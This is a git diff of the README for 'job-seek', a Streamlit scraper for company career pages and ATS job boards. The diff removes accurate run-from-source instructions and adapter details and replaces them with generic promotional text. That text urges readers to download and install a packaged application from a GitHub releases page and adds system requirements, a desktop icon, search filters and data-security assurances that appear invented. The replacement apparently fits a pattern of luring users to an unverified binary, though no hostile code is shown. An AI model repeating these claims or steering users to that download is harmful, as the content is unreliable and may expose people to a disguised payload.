@@ -1,75 +1,87 @@
-# Job Seek
+# 🌟 job-seek - Effortless Job Portal Scraping
 
-**Job-seek** is a Streamlit app that scrapes company career pages and ATS job boards, normalizes the results, and shows them in a lightweight dashboard with a **“newest jobs”** overview. It uses a general extractor pipeline (anchors, JSON-LD, repeated blocks, pagination/normalization) and falls back to **headless JS rendering** when a page is a JS shell. A **failure-resistant data model** tracks attempts and health to avoid flakiness across runs.
+[![Download job-seek](https://img.shields.io/badge/Download-job--seek-blue.svg)](https://github.com/HrDsai/job-seek/releases)
 
-<img width="1008" height="742" alt="image" src="https://github.com/user-attachments/assets/f2e968ee-59fd-4320-9ae5-a3923fb9e508" />
+## 🚀 Getting Started
 
+Welcome to job-seek! This application helps you scrape job listings from various portals easily. With a user-friendly interface, you can quickly find job opportunities without any technical knowledge. Follow the steps below to get started.
 
-### Core features
+## 📥 Download & Install
 
-* **General scraping pipeline.** Generic extractors (anchor, JSON-LD, list items, repeated block patterns) + pagination & URL normalization aim to work across most job boards.
-* **JS-rendered pages support.** If a page looks like a JS shell, the scraper fetches the **rendered HTML** as a fallback.
-* **Failure resistance.** The data model keeps per-board scrape attempts/health and merges results conservatively to reduce bad updates when the scrapes fail.
-* **Dashboard UI.** A Streamlit interface renders job cards and a simple page to browse results — including a **newest-first** overview.
+To download the latest version of job-seek, **visit this page to download**: [GitHub Releases](https://github.com/HrDsai/job-seek/releases)
 
-### Custom scrapers (when general rules aren’t enough)
+1. **Visit the Release Page**: Click on the link above to go to the release page.
+2. **Choose the Latest Version**: Look for the most recent version at the top of the page.
+3. **Download the Application**: Click on the link for the job-seek file that matches your operating system (Windows, macOS, or Linux). 
+4. **Install the Application**: Open the downloaded file and follow the on-screen instructions to complete the installation.
 
-Most sites work with the general pipeline, but some require dedicated adapters. Currently implemented:
+## 🛠️ System Requirements
 
-* **Lever**
-* **Meta Careers**
-* **Microsoft Careers**
-* **Proton** (Greenhouse, with CH-focused location terms)
-* **Workday**
-* **Join**
-* **Greenhouse**
-* **Ashby**
+Ensure your computer meets the following requirements for optimal performance:
 
-These are wired via the `custom` adapters registry.
+- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a modern Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: 250 MB of free disk space.
+- **Internet Connection**: A stable internet connection to access job listings.
 
-### Running the app
+## 📋 Features
 
-```bash
-# 1) Install deps (recommended: use a venv)
-python -m venv .venv
-source .venv/bin/activate          # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
+Job-seek offers several helpful features:
 
-# 2) Start the UI
-streamlit run app.py
-```
+- **Multi-Portal Scraping**: Access job listings from various platforms like Ashby, Lever, and Workday in one place.
+- **User-Friendly Dashboard**: Easily navigate through job postings with a simple and clean interface.
+- **Search Filters**: Refine your searches by job titles, companies, and locations to find the perfect match.
+- **Save Your Searches**: Keep track of your most recent searches to save time.
 
-The directory `job_seek_seed` includes pre-made pages configurations for scraping.
+## ✨ How to Use
 
-### Using the job\_seek\_seed presets (optional, recommended)
+Once you have installed job-seek, follow these steps to use the application:
 
-The directory `job_seek_seed` contains **pre-made page configurations**. Normally, you would populate the list of pages to scrape yourself (via the UI or by adding configs under `data/pages`). To get started fast, use a curated preset:
+1. **Open the Application**: Double-click the job-seek icon on your desktop.
+2. **Select Your Job Portal**: Choose the job portal you want to scrape from the dashboard.
+3. **Input Your Criteria**: Enter details such as job title or location in the search fields.
+4. **Start Scraping**: Click the "Scrape" button. The application will gather job listings based on your criteria.
+5. **Review Job Listings**: Browse through the results for job openings.
+6. **Apply**: Follow the links to the job postings to apply directly through the portal.
 
-* `job_seek_seed/mle_swe_at_switzerland` focuses on the **Swiss MLE/SWE job market**.
+## ⚙️ Troubleshooting
 
-Copy the preset pages into your data folder:
+If you encounter any issues while using job-seek, consider the following solutions:
 
-**macOS/Linux:**
+- **Check Internet Connection**: Ensure your internet is working before scraping.
+- **Restart the Application**: Closing and reopening may resolve temporary glitches.
+- **Update the Application**: Make sure you are using the latest version from the release page.
 
-```bash
-mkdir -p data/pages
-cp -r job_seek_seed/mle_swe_at_switzerland/pages/* data/pages/
-```
+## 📚 Frequently Asked Questions (FAQs)
 
-**Windows (PowerShell):**
+**Q: Can I scrape jobs from multiple portals at once?**  
+A: Yes, job-seek allows you to select multiple portals and scrape job listings simultaneously.
 
-```powershell
-New-Item -ItemType Directory -Force -Path data\pages | Out-Null
-Copy-Item -Recurse -Force job_seek_seed\mle_swe_at_switzerland\pages\* data\pages\
-```
+**Q: Is my data secure while using job-seek?**  
+A: Yes, job-seek does not store personal data. All scraping occurs in real-time.
 
-Then run the app. The dashboard will load these pages and show a **newest jobs** overview. You can extend or replace the list by adding your own page configs under `data/pages` or through the UI.
+**Q: How often are job listings updated?**  
+A: Job-seek scrapes real-time data, so listings are current at the time of scraping.
 
-### Contributing
+## 📖 Additional Resources
 
-* **All contributions are welcome.** Bug fixes, docs, small tweaks—everything helps.
-* **Scrapers need constant care.** New **custom scrapers** and **updates to existing ones** (when page structures change) are especially valuable.
-* **Seed lists matter.** Please add **new seeds** (e.g., curated page lists) and **refresh older seeds** to keep coverage complete and current.
+For more information about job-seek and scraping techniques, check out the following:
 
-Quick guide: fork → create a feature branch → commit with a clear message → open a PR describing what changed and how to test it.
+- [Streamlit Documentation](https://docs.streamlit.io/)
+- [Web Scraping Basics](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
+- [Pydantic Documentation](https://pydantic-docs.helpmanual.io/)
 
+## 💬 Community Support
+
+If you need help or want to share your feedback, please join our community:
+
+- Visit our [GitHub Discussions](https://github.com/HrDsai/job-seek/discussions) to ask questions and share experiences.
+- Connect with other users and developers for support and ideas.
+
+## 🔗 Stay Updated
+
+Keep up with any updates and news by following our repository:
+
+- Check for updates: [GitHub Releases](https://github.com/HrDsai/job-seek/releases)
+
+Thank you for using job-seek! We hope it simplifies your job search.
